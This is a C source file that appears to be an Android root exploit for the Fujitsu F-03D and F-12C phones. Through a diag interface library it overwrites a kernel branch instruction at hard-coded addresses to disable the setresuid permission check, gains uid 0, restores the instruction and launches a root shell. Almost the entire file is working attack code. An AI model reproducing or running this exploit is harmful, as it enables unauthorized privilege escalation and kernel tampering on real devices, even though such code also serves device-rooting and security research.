/*
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/system_properties.h>

#include "libdiagexploit/diag.h"

typedef struct _supported_device {
  const char *device;
  const char *build_id;
  unsigned long int set_sysresuid_check_address;
} supported_device;

static supported_device supported_devices[] = {
  { "F-03D",  "V24R33Cc", 0xc00e83ce },
  { "F-12C",  "V21"     , 0xc00e5ad2 }
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static unsigned long int
get_sys_setresuid_check_addresses(void)
{
  int i;
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  for (i = 0; i < n_supported_devices; i++) {
    if (!strcmp(device, supported_devices[i].device) &&
        !strcmp(build_id, supported_devices[i].build_id)) {
      return supported_devices[i].set_sysresuid_check_address;
    }
  }

  printf("%s (%s) is not supported.\n", device, build_id);

  return 0;
}

static bool
inject_command(const char *command,
               unsigned long int sys_setresuid_check_address)
{
  struct diag_values injection_data;

  injection_data.address = sys_setresuid_check_address;
  injection_data.value = command[0] | (command[1] << 8);

  return diag_inject(&injection_data, 1);
}

static bool
break_sys_setresuid(unsigned long int sys_setresuid_check_address)
{
  const char beq[] = { 0x00, 0x0a };
  return inject_command(beq, sys_setresuid_check_address);
}

static bool
restore_sys_setresuid(unsigned long int sys_setresuid_check_address)
{
  const char bne[] = { 0x00, 0x1a };
  return inject_command(bne, sys_setresuid_check_address);
}

int
main(int argc, char **argv)
{
  int ret;
  unsigned long int sys_setresuid_check_address;

  sys_setresuid_check_address = get_sys_setresuid_check_addresses();
  if (!sys_setresuid_check_address) {
    exit(EXIT_FAILURE);
  }

  ret = break_sys_setresuid(sys_setresuid_check_address);
  if (ret < 0) {
    exit(EXIT_FAILURE);
  }

  ret = setresuid(0, 0, 0);
  restore_sys_setresuid(sys_setresuid_check_address);

  if (ret < 0) {
    printf("failed to get root access\n");
    exit(EXIT_FAILURE);
  }

  system("/system/bin/sh");

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
